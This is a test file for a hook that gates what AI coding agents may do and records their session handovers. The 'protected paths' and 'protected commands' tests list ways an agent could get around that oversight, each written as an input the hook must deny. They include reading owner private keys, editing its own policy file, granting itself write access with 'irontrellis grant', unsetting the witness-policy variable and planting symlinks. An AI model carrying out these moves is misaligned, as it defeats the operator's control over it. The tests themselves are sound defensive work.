  let record = JSON.parse(readFileSync(file, "utf8"));
  assert.equal(record.version, "irontrellis-hook-handover/1");
  assert.equal(record.final, false);
  assert.ok(JSON.parse(readFileSync(keyFileOf(dir, "cc-session-1"), "utf8")).privateKey, "Stop keeps the session key");
  const end = hook("claude-code", "SessionEnd", claude.sessionEnd(dir), dir);
  assert.equal(end.code, 0, end.stderr);
  assert.equal(end.stdout, "");
  assert.match(end.stderr, /session cc-session-1 ended \(prompt_input_exit\) with 0 open duties\./);
  assert.match(end.stderr, /Live grants held: none\. None of them follows a successor\./);
  assert.match(end.stderr, new RegExp(`Handover record: ${esc(file)}`));
  record = JSON.parse(readFileSync(file, "utf8"));
  assert.equal(record.final, true);
  assert.equal(record.protocol, "claude-code");
  assert.equal(record.agent, "claude-code");
  assert.deepEqual(record.historySessionIds, ["session:cc-session-1"]);
  assert.equal(record.reason, "prompt_input_exit");
  assert.equal(record.report.agent, "claude-code");
  assert.deepEqual(record.report.openDuties, []);
  assert.equal(record.report.sessions[0].current, true);
  assert.equal(record.report.survives.kind, "SURVIVES");
  if (process.platform !== "win32") assert.equal(statSync(file).mode & 0o777, 0o600); // POSIX modes (Windows: ACLs, docs/PLATFORMS.md §3)
});

test("claude-code: an open duty recorded by the session shows up at the next SessionStart and in the handover", async () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const config = configOf(dir);
  const base = { historyFile: historyOf(dir), domain: config.domain, owner: config.owner, controller: config.controller, now: () => Date.now() };
  const owner = openLocalOwner(base);
  const now = Date.now();
  // A duty needs a recorded operation: the session's own key (written by the hook) signs it through the core runtime API.
  await owner.createAgent({ id: "successor" });
  await owner.declareSuccession({ id: "rule:handover", from: "claude-code", to: "successor", role: "role:coding-agent" });
  await owner.grant({ id: "grant:migrate", to: "claude-code", actions: ["migrate", "OBLIGATE"], resources: ["db:main"], expiresAt: now + DAY });
  await owner.grant({ id: "grant:review", to: "successor", actions: ["record-collection-disposition"], resources: ["duty:migration"], expiresAt: now + DAY });
  const key = JSON.parse(readFileSync(keyFileOf(dir, "cc-session-1"), "utf8"));
  const options = { ...base, session: "session:cc-session-1", signHash: signHashWith(keyPairFromPrivateKey("ed25519", key.keyId, key.privateKey)) };
  const op = { id: "operation:migrate", action: "migrate", resource: "db:main", role: "role:coding-agent", tenure: "tenure:role:coding-agent:1", termsCommitment: commitTerms({ subject: "migration" }) };
  const sim = openLocalSimulation(options);
  const ran = await sim.run(op);
  assert.equal(ran.status, "SIMULATION_RESULT", JSON.stringify(ran));
  await sim.recordReceipt(op);
  await openLocalRuntime(options).obligate({ id: "duty:migration", operation: op.id, description: "migration step 4 of 7", deadline: now + 3 * DAY, succession: "rule:handover", reviewAuthority: "grant:review" });
  const end = hook("claude-code", "SessionEnd", claude.sessionEnd(dir), dir);
  assert.match(end.stderr, /ended \(prompt_input_exit\) with 1 open duty: migration step 4 of 7 \(obligation duty:migration, open\)\./);
  const record = JSON.parse(readFileSync(handoverOf(dir, "cc-session-1"), "utf8"));
  assert.equal(record.report.openDuties.length, 1);
  assert.equal(record.report.openDuties[0].id, "duty:migration");
  const next = hook("claude-code", "SessionStart", claude.sessionStart(dir, "cc-session-2"), dir);
  assert.match(next.json.hookSpecificOutput.additionalContext, /opens with 1 open duty: migration step 4 of 7 \(obligation duty:migration, open\)\. This session may run-shell on repo:/);
});

// ---------------------------------------------------------------- Codex

test("codex: the same wire shape, no decision on ALLOW, ask degraded to askFallback", () => {
  const dir = project();
  run(["init", "--agent", "codex", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  const start = hook("codex", "SessionStart", codex.sessionStart(dir), dir);
  assert.equal(start.code, 0, start.stderr);
  assert.equal(start.json.hookSpecificOutput.hookEventName, "SessionStart");
  assert.match(start.json.hookSpecificOutput.additionalContext, /session thr_123 \(agent codex, runtime session:thr_123, epoch 1\) opens with 0 open duties\. This session may run-shell/);
  assert.equal(events(dir).find((e) => e.type === "RUNTIME_SESSION_ADMITTED" && e.data.agentId === "codex").data.sessionId, "session:thr_123");
  assertDefer(hook("codex", "PreToolUse", codex.preToolUse(dir, "Bash", { command: "cargo test" }), dir), /IronTrellis · ALLOW: codex run-shell/);
  const patch = hook("codex", "PreToolUse", codex.preToolUse(dir, "apply_patch", { command: "*** Begin Patch\n*** Update File: a.rs\n*** End Patch" }), dir);
  assert.equal(patch.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(patch.json.hookSpecificOutput.permissionDecisionReason, /DENY: codex may not write files in \S+ \(ACTION_NOT_ALLOWED; .*write-file on repo:/);
  const unmapped = hook("codex", "PreToolUse", codex.preToolUse(dir, "spawn_agent", { task: "x" }), dir);
  assert.equal(unmapped.json.hookSpecificOutput.permissionDecision, "deny");
  assert.match(unmapped.json.hookSpecificOutput.permissionDecisionReason, /IronTrellis would ask, but this host event cannot, so askFallback "deny" applies/);
  assertDefer(hook("codex", "PreToolUse", codex.preToolUse(dir, "update_plan", { plan: [] }), dir), /read-only/);
  setConfig(dir, { decisions: { onAllow: "allow" } });
  assert.equal(hook("codex", "PreToolUse", codex.preToolUse(dir, "Bash", { command: "cargo test" }), dir).json.hookSpecificOutput.permissionDecision, "allow");
  const end = hook("codex", "SessionEnd", codex.sessionEnd(dir), dir);
  assert.equal(end.code, 0, end.stderr);
  assert.match(end.stderr, /session thr_123 ended \(other\) with 0 open duties/);
  assert.ok(existsSync(handoverOf(dir, "thr_123")));
});

test("codex: askFallback allow lets an unmapped tool through with the reason", () => {
  const dir = project();
  run(["init", "--agent", "codex"], { cwd: dir });
  hook("codex", "SessionStart", codex.sessionStart(dir), dir);
  setConfig(dir, { askFallback: "allow" });
  const r = hook("codex", "PreToolUse", codex.preToolUse(dir, "spawn_agent", {}), dir);
  assert.equal(r.json.hookSpecificOutput.permissionDecision, "allow");
  assert.match(r.json.hookSpecificOutput.permissionDecisionReason, /askFallback "allow"/);
});

// ---------------------------------------------------------------- Cursor

test("cursor: permission answers on the shell, MCP and preToolUse hooks; stop and sessionEnd write the handover", () => {
  const dir = project();
  run(["init", "--agent", "cursor", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  const start = hook("cursor", "sessionStart", cursor.sessionStart(dir), dir);
  assert.equal(start.code, 0, start.stderr);
  assert.deepEqual(Object.keys(start.json), ["additional_context"]);
  assert.match(start.json.additional_context, /session conv-1 \(agent cursor, runtime session:conv-1, epoch 1\) opens with 0 open duties/);
  // Cursor's permission hooks must answer, so "no objection" is rendered as allow (with the reason).
  const shell = hook("cursor", "beforeShellExecution", cursor.shell(dir, "npm test"), dir);
  assert.equal(shell.code, 0, shell.stderr);
  assert.equal(shell.json.permission, "allow");
  assert.match(shell.json.agent_message, /ALLOW: cursor run-shell on repo:.*left to the host's own permission check/);
  const mcp = hook("cursor", "beforeMCPExecution", cursor.mcp(dir, "github", "create_issue", { title: "x" }), dir);
  assert.equal(mcp.json.permission, "deny");
  assert.match(mcp.json.user_message, /DENY: cursor may not call MCP tools on the MCP server github \(ACTION_NOT_ALLOWED; .*call-mcp on mcp:github/);
  // preToolUse defers shell and MCP calls to their own gates, checks the rest, and cannot ask.
  const deferred = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Shell", { command: "npm test", working_directory: dir }), dir);
  assert.equal(deferred.json.permission, "allow");
  assert.match(deferred.json.agent_message, /checked by the beforeShellExecution hook/);
  const write = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Write", { file_path: `${dir}/a.ts`, content: "" }), dir);
  assert.equal(write.json.permission, "deny");
  const read = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Read", { file_path: `${dir}/a.ts` }), dir);
  assert.equal(read.json.permission, "allow");
  const task = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Task", { description: "x" }), dir);
  assert.equal(task.json.permission, "allow"); // Task is read-only in the default Cursor policy
  const unmapped = hook("cursor", "preToolUse", cursor.preToolUse(dir, "Deploy", {}), dir);
  assert.equal(unmapped.json.permission, "deny");
  assert.match(unmapped.json.user_message, /askFallback "deny"/);
  // Protective rules apply on Cursor too, including on the deferred preToolUse.
  const control = hook("cursor", "beforeShellExecution", cursor.shell(dir, "irontrellis grant g --to cursor --actions write-file"), dir);
  assert.equal(control.json.permission, "deny");
  assert.match(control.json.user_message, /protected: IronTrellis control commands are for the operator, not the agent/);
  assert.equal(hook("cursor", "preToolUse", cursor.preToolUse(dir, "Shell", { command: "cat ~/.irontrellis/x" }), dir).json.permission, "deny");
  const stop = hook("cursor", "stop", cursor.stop(dir), dir);
  assert.equal(stop.code, 0, stop.stderr);
  assert.deepEqual(stop.json, {});
  const file = handoverOf(dir, "conv-1");
  assert.equal(JSON.parse(readFileSync(file, "utf8")).final, false);
  const end = hook("cursor", "sessionEnd", cursor.sessionEnd(dir), dir);
  assert.equal(end.code, 0, end.stderr);
  assert.match(end.stderr, /session conv-1 ended \(completed\)/);
  assert.equal(JSON.parse(readFileSync(file, "utf8")).final, true);
  // Ignored hooks still answer a schema-valid document.
  const edit = hook("cursor", "afterFileEdit", { ...cursorBase(dir, "afterFileEdit"), file_path: `${dir}/a.ts`, edits: [] }, dir);
  assert.equal(edit.code, 0);
  assert.equal(edit.json.permission, "allow");
});

// ---------------------------------------------------------------- protective rules (B2)

test("protected paths: the history, keys, sessions, handovers and the config cannot be referenced, whatever the policy says", () => {
  const dir = project();
  run(["init", "--allow", "run-shell,write-file", "--expires", "+1d", RISK], { cwd: dir });
  hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  const history = historyOf(dir);
  const configPath = join(dir, "irontrellis-hook.json");
  // A policy that would wave everything through does not switch the rules off.
  setConfig(dir, { decisions: { onAllow: "allow", onReadOnly: "allow" }, policy: { ...configOf(dir).policy, readOnly: ["*"] } });
  const denied = (tool, input, pattern) => {
    const r = hook("claude-code", "PreToolUse", claude.preToolUse(dir, tool, input), dir);
    assert.equal(r.code, 2, r.stderr);
    assert.equal(r.json?.hookSpecificOutput?.permissionDecision, "deny", `${tool} ${JSON.stringify(input)} → ${r.stdout}${r.stderr}`);
    assert.match(r.json.hookSpecificOutput.permissionDecisionReason, pattern ?? /^IronTrellis · DENY: protected: the tool input references .*\(PROTECTED_PATH\)$/);
  };
  // The review's reproduction: reading the owner key.
  denied("Read", { file_path: `${history}.owner-key.json` });
  denied("Read", { file_path: history });
  denied("Read", { file_path: keyFileOf(dir, "cc-session-1") });
  denied("Read", { file_path: handoverOf(dir, "cc-session-1") });
  denied("Grep", { pattern: "privateKey", path: `${history}.sessions` });
  denied("Bash", { command: `cat ${history}.head` });
  denied("Bash", { command: "cat ~/.irontrellis/projects/*/history.jsonl.owner-key.json" }, /references "\.irontrellis"/);
  denied("Bash", { command: `sed -i 's/"readOnly": \\[/"readOnly": ["*",/' irontrellis-hook.json` }, /references "irontrellis-hook\.json"/);
  denied("Write", { file_path: configPath, content: "{}" });
  denied("Edit", { file_path: "irontrellis-hook.json", old_string: "a", new_string: "b" });
  denied("MultiEdit", { file_path: `${history}.sessions/x.json`, edits: [] });
  denied("NotebookEdit", { notebook_path: `${history}.handovers/x.ipynb`, new_source: "" });
  denied("mcp__fs__read_file", { args: { paths: [`${history}.owner-key.json`] } });
  // Pre-rotation: the committed next key beside the history, its pending file, and a copy under that name anywhere.
  denied("Read", { file_path: `${history}.owner-next-key.json` });
  denied("Read", { file_path: `${history}.owner-next-key.pending.json` });
  denied("Bash", { command: "cp /media/usb/history.jsonl.owner-next-key.json /tmp/k" }, /references "\.owner-next-key\."/);
  denied("Read", { file_path: `${history}.rotation.pending.json` });
  denied("Bash", { command: "cp /tmp/saved.rotation.pending.json /tmp/x" }, /references "\.rotation\.pending\."/);
  denied("mcp__fs__write_file", { path: configPath, content: "{}" });
  // A symlink planted in the project is resolved before matching.
  symlinkSync(`${history}.owner-key.json`, join(dir, "innocent.json"));
  denied("Read", { file_path: "innocent.json" });
  denied("Read", { file_path: `${dir}/innocent.json` });
  // Ordinary calls are unaffected (and, with this config, allowed).
  assert.equal(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: `${dir}/src/a.ts` }), dir).json.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "grep -r irontrellis src/" }), dir).json.hookSpecificOutput.permissionDecision, "allow");
  // `check` applies the same rules.
  const check = run(["check", "claude-code", "Read", "--input", JSON.stringify({ file_path: `${history}.owner-key.json` })], { cwd: dir });
  assert.equal(check.code, 2);
  assert.match(check.stdout, /^DENY  IronTrellis · DENY: protected: .*\(PROTECTED_PATH\)$/m);
});

test("protected commands: IronTrellis writing subcommands are refused in shell calls", () => {
  const cmd = (c) => controlCommand(c);
  // The review's reproduction.
  assert.equal(cmd("irontrellis --history .irontrellis/history.jsonl grant esc --to claude-code --actions write-file --resources repo:/tmp/itw/app --expires +1d"), "irontrellis grant");
  for (const sub of ["grant", "delegate", "prohibit", "revoke", "agent", "role", "appoint", "unappoint", "succession", "succeed", "session", "epoch", "init", "migrate", "anchor", "install"]) {
    assert.equal(cmd(`irontrellis ${sub} x`), `irontrellis ${sub}`, sub);
  }
  assert.equal(cmd("npx irontrellis-hook init --allow run-shell"), "irontrellis-hook init");
  assert.equal(cmd("FOO=1 /usr/local/bin/irontrellis revoke g1"), "irontrellis revoke");
  assert.equal(cmd("cd /tmp && irontrellis-mcp-ops revoke --config x"), "irontrellis-mcp-ops revoke");
  assert.equal(cmd("echo $(node ./node_modules/.bin/irontrellis.mjs epoch advance a)"), "irontrellis epoch");
  assert.equal(cmd("'irontrellis' \"delegate\" d1"), "irontrellis delegate");
  assert.equal(cmd("irontrellis-hook session release --all"), "irontrellis-hook session");
  // Every owner-key subcommand (pre-rotation included).
  for (const sub of ["status", "commit-next-key", "rotate-key --next-key /media/usb/next.json"]) assert.equal(cmd(`irontrellis owner ${sub}`), "irontrellis owner", sub);
  // Reading commands and unrelated mentions are not control commands.
  assert.equal(cmd("irontrellis verify --json"), undefined);
  assert.equal(cmd("irontrellis --history h why --actor a --action b --resource c"), undefined);
  assert.equal(cmd("irontrellis-hook check claude-code Bash"), undefined);
  assert.equal(cmd("git grant-access; echo irontrellis"), undefined);
  assert.equal(cmd("npm run grant"), undefined);
  // End to end, through each shell spelling, before any policy or session check.
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  const r = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "irontrellis grant esc --to claude-code --actions write-file" }, "no-session"), dir);
  assert.equal(r.json.hookSpecificOutput.permissionDecision, "deny");
  assert.equal(r.json.hookSpecificOutput.permissionDecisionReason, "IronTrellis · DENY: protected: IronTrellis control commands are for the operator, not the agent (irontrellis grant) (PROTECTED_COMMAND)");
  const config = validateConfig({ history: "/s/h.jsonl", owner: "o", agentId: "a", policy: { sideEffecting: [{ tool: "run_terminal", action: "run-shell", resource: "repo:${project}" }], readOnly: [] } }, "/p/irontrellis-hook.json");
  assert.equal(protection(config, "run_terminal", { command: "irontrellis anchor --kind local" }, "/p")?.code, "PROTECTED_COMMAND");
  // A file that merely mentions IronTrellis can be written; only a write tool's target path is checked.
  assert.equal(protection(config, "Write", { file_path: "/p/README.md", content: "run `irontrellis grant`; state in ~/.irontrellis, see irontrellis-hook.json" }, "/p"), undefined);
  assert.equal(protection(config, "Edit", { file_path: "/p/docs.md", old_string: "a", new_string: "/s/h.jsonl.owner-key.json" }, "/p"), undefined);
  assert.equal(protection(config, "Write", { file_path: "/s/h.jsonl.head", content: "" }, "/p")?.code, "PROTECTED_PATH");
  // Codex apply_patch: the files the patch names.
  assert.equal(protection(config, "apply_patch", { command: "*** Begin Patch\n*** Update File: irontrellis-hook.json\n@@\n-a\n+b\n*** End Patch" }, "/p")?.code, "PROTECTED_PATH");
  assert.equal(protection(config, "apply_patch", { command: "*** Begin Patch\n*** Update File: src/a.ts\n+// see .irontrellis\n*** End Patch" }, "/p"), undefined);
  // The operator's out-of-band witness policy: the variable, the recommended file name, and the file the hook's own
  // environment names (the agent must neither edit it nor unset the variable for its own commands).
  assert.equal(protection(config, "Bash", { command: "unset IRONTRELLIS_WITNESS_POLICY; node tool.js" }, "/p")?.code, "PROTECTED_PATH");
  assert.equal(protection(config, "Write", { file_path: "/etc/irontrellis/irontrellis-witness-policy.json", content: "{}" }, "/p")?.code, "PROTECTED_PATH");
  const before = process.env.IRONTRELLIS_WITNESS_POLICY;
  process.env.IRONTRELLIS_WITNESS_POLICY = "/opt/ops/witnesses.json";
  try {
    assert.ok(protectedTargets(config).some((t) => t.path === "/opt/ops/witnesses.json"));
    assert.equal(protection(config, "Edit", { file_path: "/opt/ops/witnesses.json", old_string: "a", new_string: "b" }, "/p")?.code, "PROTECTED_PATH");
    assert.equal(protection(config, "Read", { file_path: "/opt/ops/other.json" }, "/p"), undefined);
  } finally {
    if (before === undefined) delete process.env.IRONTRELLIS_WITNESS_POLICY; else process.env.IRONTRELLIS_WITNESS_POLICY = before;
  }
});

// ---------------------------------------------------------------- failures and configuration

test("malformed tool events fail closed (H2); non-tool events do not block", () => {
  const dir = project();
  run(["init", "--allow", "run-shell", "--expires", "+1d", RISK], { cwd: dir });
  // The review's reproduction: PreToolUse without session_id.
  const noSession = run(["claude-code", "PreToolUse"], { cwd: dir, stdin: JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "Write", tool_input: { file_path: "x" } }) });
  assert.equal(noSession.code, 2);
  assert.match(noSession.stderr, /refused a malformed PreToolUse event: PreToolUse without a string session_id/);
  const cases = [
    ["claude-code", "PreToolUse", { ...claude.preToolUse(dir, "Bash", { command: "ls" }), session_id: 42 }],
    ["claude-code", "PreToolUse", { ...claude.preToolUse(dir, "Bash", { command: "ls" }), tool_name: ["Bash"] }],
    ["claude-code", "PreToolUse", { ...claude.preToolUse(dir, "Bash", "ls") }],
    ["codex", "PreToolUse", { ...codex.preToolUse(dir, "Bash", { command: "ls" }), session_id: undefined }],
    ["codex", "PreToolUse", { ...codex.preToolUse(dir, "Bash", { command: "ls" }), tool_name: 7 }],
  ];
  for (const [agent, event, payload] of cases) {
    const r = hook(agent, event, payload, dir);
    assert.equal(r.code, 2, `${agent} ${JSON.stringify(payload)}`);
    assert.equal(r.stdout, "");
    assert.match(r.stderr, /refused a malformed PreToolUse event/);
  }
  const cursorCases = [
    ["beforeShellExecution", { ...cursor.shell(dir, "ls"), command: undefined }],
    ["beforeShellExecution", { ...cursor.shell(dir, "ls"), conversation_id: undefined }],
    ["beforeMCPExecution", { ...cursor.mcp(dir, "github", "x"), tool_name: undefined }],
    ["beforeMCPExecution", { ...cursor.mcp(dir, "github", "x"), tool_input: "nope" }],
    ["preToolUse", { ...cursor.preToolUse(dir, "Write", {}), tool_name: 3 }],
  ];
  for (const [event, payload] of cursorCases) {
    const r = hook("cursor", event, payload, dir);
    assert.equal(r.code, 2, `${event} ${JSON.stringify(payload)}`);
    assert.equal(r.json.permission, "deny");
    assert.match(r.json.user_message, new RegExp(`refused a malformed ${event} event`));
  }
  // Invalid JSON and non-objects on stdin: tool events are refused, other events are non-blocking errors.
  for (const stdin of ["not json", "[1,2]", "null"]) {
    assert.equal(run(["claude-code", "PreToolUse"], { cwd: dir, stdin }).code, 2, stdin);
    assert.equal(run(["codex", "PreToolUse"], { cwd: dir, stdin }).code, 2, stdin);
    const c = run(["cursor", "beforeShellExecution"], { cwd: dir, stdin });
    assert.equal(c.code, 2, stdin);
    assert.equal(c.json.permission, "deny");
  }
  assert.equal(run(["claude-code", "SessionStart"], { cwd: dir, stdin: "not json" }).code, 1);
  // Non-tool events without a session id are ignored (exit 0).
  assert.equal(hook("claude-code", "SessionStart", { ...claude.sessionStart(dir), session_id: undefined }, dir).code, 0);
  assert.equal(hook("claude-code", "SessionEnd", { ...claude.sessionEnd(dir), session_id: undefined }, dir).code, 0);
  assert.equal(hook("claude-code", "Stop", { ...claude.stop(dir), session_id: undefined }, dir).code, 0);
  // failOpen lets them through: for Claude Code exit 0 with a visible warning (the hook wrapper turns any other failure into a
  // refusal); for Codex a non-blocking error (exit 1), as before.
  setConfig(dir, { failOpen: true });
  for (const r of [run(["claude-code", "PreToolUse"], { cwd: dir, stdin: "not json" }), hook("claude-code", "PreToolUse", { ...claude.preToolUse(dir, "Bash", { command: "ls" }), session_id: 42 }, dir)]) {
    assert.equal(r.code, 0); assert.match(r.json.systemMessage, /lets it through \("failOpen": true\)/);
  }
  assert.equal(run(["codex", "PreToolUse"], { cwd: dir, stdin: "not json" }).code, 1);
});

test("missing or invalid configuration: tool events fail closed, session events fail open", () => {
  const dir = project();
  const tool = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir);
  assert.equal(tool.code, 2);
  assert.equal(tool.stdout, "");
  assert.match(tool.stderr, /no irontrellis-hook\.json found/);
  const start = hook("claude-code", "SessionStart", claude.sessionStart(dir), dir);
  assert.equal(start.code, 1);
  assert.match(start.stderr, /no irontrellis-hook\.json found/);
  const cursorTool = hook("cursor", "beforeShellExecution", cursor.shell(dir, "ls"), dir);
  assert.equal(cursorTool.code, 2);
  assert.equal(cursorTool.json.permission, "deny");
  // Invalid documents.
  const path = join(dir, "irontrellis-hook.json");
  writeFileSync(path, "{ not json");
  assert.match(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir).stderr, /not valid JSON/);
  writeFileSync(path, JSON.stringify({ history: "h.jsonl", owner: "o", agentId: "a", policy: { sideEffecting: [], readOnly: [] }, surprise: 1 }));
  assert.match(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir).stderr, /unknown keys: surprise/);
  writeFileSync(path, JSON.stringify({ history: "h.jsonl", owner: "o", agentId: "a", policy: { sideEffecting: [{ tool: "Bash", action: "run-shell" }], readOnly: [] } }));
  assert.match(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir).stderr, /sideEffecting\[0\]\.resource/);
  writeFileSync(path, JSON.stringify({ history: "h.jsonl", owner: "o", agentId: "a", askFallback: "maybe", policy: { sideEffecting: [], readOnly: [] } }));
  assert.match(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir).stderr, /askFallback must be/);
  // A valid config whose history is missing: fail closed, unless failOpen.
  writeFileSync(path, JSON.stringify({ history: "missing.jsonl", owner: "o", agentId: "a", policy: { sideEffecting: [{ tool: "Bash", action: "run-shell", resource: "repo:${project}" }], readOnly: [] } }));
  const missing = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir);
  assert.equal(missing.code, 2);
  assert.match(missing.stderr, /READ_UNAVAILABLE: no history at/);
  writeFileSync(path, JSON.stringify({ history: "missing.jsonl", owner: "o", agentId: "a", failOpen: true, policy: { sideEffecting: [{ tool: "Bash", action: "run-shell", resource: "repo:${project}" }], readOnly: [] } }));
  const passed = hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Bash", { command: "ls" }), dir);
  assert.equal(passed.code, 0); assert.match(passed.json.systemMessage, /READ_UNAVAILABLE: no history at/); // failOpen: through, with the warning
  // The env override and unknown events.
  const other = project();
  run(["init"], { cwd: other });
  const env = { IRONTRELLIS_HOOK_CONFIG: join(other, "irontrellis-hook.json") };
  assert.equal(hook("claude-code", "SessionStart", claude.sessionStart(dir), dir, env).code, 0);
  assertDefer(hook("claude-code", "PreToolUse", claude.preToolUse(dir, "Read", { file_path: "x" }), dir, env), /read-only/);
  assert.equal(run(["claude-code", "Nope"], { cwd: dir, stdin: "{}" }).code, 1);
  assert.equal(run(["gemini", "PreToolUse"], { cwd: dir, stdin: "{}" }).code, 1);
});

test("private files: names are sha256 of the host session id, and symlinks are refused (L7)", () => {
  const dir = project();
  run(["init"], { cwd: dir });
  // Ids that the old sanitiser mapped to one file get different files; path characters never reach the file system.
  for (const id of ["a/b", "a_b", "../../escape"]) {
    assert.equal(hook("claude-code", "SessionStart", claude.sessionStart(dir, id), dir).code, 0);
    hook("claude-code", "SessionEnd", claude.sessionEnd(dir, id), dir);
  }
  const names = readdirSync(`${historyOf(dir)}.sessions`).sort();
  assert.deepEqual(names, ["a/b", "a_b", "../../escape"].map((id) => `${sha(id)}.json`).sort());
  assert.deepEqual(readdirSync(`${historyOf(dir)}.handovers`).sort(), names);
  assert.equal(JSON.parse(readFileSync(handoverOf(dir, "a/b"), "utf8")).hostSessionId, "a/b");
  // A symlink planted where the handover goes is refused, and its target is not written.
  hook("claude-code", "SessionStart", claude.sessionStart(dir, "victim"), dir);
  const target = join(dir, "target.txt");
  symlinkSync(target, handoverOf(dir, "victim"));
  const stop = hook("claude-code", "Stop", claude.stop(dir, "victim"), dir);
  assert.equal(stop.code, 1);
  assert.match(stop.stderr, /symlink or not a regular file; refusing to write it/);
  assert.ok(!existsSync(target));
  assert.ok(lstatSync(handoverOf(dir, "victim")).isSymbolicLink());
  // A symlinked sessions directory is refused too.
  const other = project();
  run(["init", "--history", "state/h.jsonl"], { cwd: other });
  mkdirSync(join(other, "elsewhere"));
  symlinkSync(join(other, "elsewhere"), join(other, "state", "h.jsonl.sessions"));
  const start = hook("claude-code", "SessionStart", claude.sessionStart(other, "s"), other);
  assert.equal(start.code, 1);
  assert.match(start.stderr, /is not a plain directory/);
  assert.deepEqual(readdirSync(join(other, "elsewhere")), []);
});

test("validateConfig, templates and tool mapping", () => {
  const cfg = validateConfig({
    history: "h.jsonl", owner: "principal:x", agentId: "claude-code",
    policy: { sideEffecting: [{ tool: "mcp__*", action: "call-mcp", resource: "mcp:${server}" }, { tool: "Write", action: "write-file", resource: "path:${file_path}" }, { tool: "Bash", action: "run-shell", resource: "repo:${project}" }], readOnly: ["Read", "Notebook*"] },
  }, "/p/irontrellis-hook.json");
  assert.equal(cfg.project, "/p");
  assert.equal(cfg.history, "/p/h.jsonl");
  assert.equal(cfg.controller, "controller:irontrellis-hook");
  assert.equal(cfg.askFallback, "deny");
  assert.equal(cfg.sessionTtlMs, DAY);
  assert.deepEqual(cfg.decisions, { onAllow: "defer", onReadOnly: "defer" });
  assert.deepEqual(validateConfig({ history: "h", owner: "o", agentId: "a", decisions: { onAllow: "allow" }, policy: { sideEffecting: [], readOnly: [] } }, "/p/c.json").decisions, { onAllow: "allow", onReadOnly: "defer" });
  assert.throws(() => validateConfig({ history: "h", owner: "o", agentId: "a", decisions: { onDeny: "allow" }, policy: { sideEffecting: [], readOnly: [] } }, "/p/c.json"), /decisions has unknown keys: onDeny/);
  assert.throws(() => validateConfig({ history: "h", owner: "o", agentId: "a", decisions: "allow", policy: { sideEffecting: [], readOnly: [] } }, "/p/c.json"), /decisions must be an object/);
  const ctx = (tool, toolInput = {}, server) => ({ project: "/p", cwd: "/p/sub", tool, server, toolInput });
  assert.deepEqual(mapTool(cfg.policy, ctx("Read")), { kind: "read-only", tool: "Read" });
  assert.deepEqual(mapTool(cfg.policy, ctx("NotebookRead")), { kind: "read-only", tool: "NotebookRead" });
  assert.equal(mapTool(cfg.policy, ctx("mcp__github__create_issue")).resource, "mcp:github");
  assert.equal(mapTool(cfg.policy, ctx("mcp__x__y", {}, "explicit")).resource, "mcp:explicit");
  assert.equal(mapTool(cfg.policy, ctx("Write", { file_path: "/p/a.txt" })).resource, "path:/p/a.txt");
  assert.equal(mapTool(cfg.policy, ctx("Write", {})).kind, "unmapped");
  assert.equal(mapTool(cfg.policy, ctx("Write", { file_path: "x".repeat(200) })).kind, "unmapped");
  assert.equal(mapTool(cfg.policy, ctx("Bash", { command: "ls" })).resource, "repo:/p");
  assert.equal(mapTool(cfg.policy, ctx("Other")).kind, "unmapped");
  assert.equal(renderTemplate("repo:${cwd}", ctx("Bash")), "repo:/p/sub");
  assert.equal(renderTemplate("${tool}:${tool_input.command}", ctx("Bash", { command: "ls" })), "Bash:ls");
  assert.equal(renderTemplate("x:${nope}", ctx("Bash")), undefined);
  assert.throws(() => validateConfig({ history: "h", owner: "o", agentId: "a", policy: { sideEffecting: [], readOnly: [], unmapped: "allow" } }, "/p/c.json"), /unmapped must be/);
  assert.throws(() => validateConfig({ history: "h", owner: "o", agentId: "a", protocol: "gemini", policy: { sideEffecting: [], readOnly: [] } }, "/p/c.json"), /protocol must be/);
  assert.throws(() => validateConfig({ history: "h", owner: "o", agentId: "a", version: "v0", policy: { sideEffecting: [], readOnly: [] } }, "/p/c.json"), /version must be/);
  assert.throws(() => validateConfig([], "/p/c.json"), /JSON object/);
});

// ---------------------------------------------------------------- install

test("install prints the host settings and --write merges them without duplicating", () => {
  const dir = project();
  const printed = run(["install", "claude-code", "--command", "/opt/bin/irontrellis-hook"], { cwd: dir });
  assert.equal(printed.code, 0, printed.stderr);
  assert.deepEqual(Object.keys(printed.json.hooks), ["SessionStart", "PreToolUse", "Stop", "SessionEnd"]);
  assert.deepEqual(printed.json.hooks.PreToolUse, [{ hooks: [{ type: "command", command: "/opt/bin/irontrellis-hook claude-code PreToolUse", timeout: 30, onFailure: "block" }] }]);
  assert.ok(!existsSync(join(dir, ".claude", "settings.json")));
  // Merge into an existing file that already has other hooks and settings.
  mkdirSync(join(dir, ".claude"));
  writeFileSync(join(dir, ".claude", "settings.json"), JSON.stringify({ permissions: { allow: ["Bash(ls)"] }, hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "echo other" }] }] } }));
  const written = run(["install", "claude-code", "--command", "irontrellis-hook", "--write", "--json"], { cwd: dir });
  assert.equal(written.code, 0, written.stderr);
  const settings = JSON.parse(readFileSync(join(dir, ".claude", "settings.json"), "utf8"));
